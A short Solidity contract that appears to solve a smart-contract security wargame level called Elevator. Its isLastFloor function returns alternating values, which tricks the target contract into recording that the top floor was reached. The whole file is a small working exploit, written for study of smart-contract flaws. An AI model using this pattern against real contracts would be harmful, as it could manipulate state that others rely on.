// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";


contract ElevatorSolved is Building {
  Elevator public elevator;
  bool public lastFloorValue; 

  constructor (address _elevator) public {
    elevator = Elevator(_elevator);
    lastFloorValue = false;
  }

  // this function can modify state a contract is being executed
  function isLastFloor(uint _floor) public override returns (bool) {
      bool returnValue = lastFloorValue;
      lastFloorValue = !returnValue;
      return returnValue;
  }

  function goTo(uint _floor) public {
    elevator.goTo(_floor);
  }
}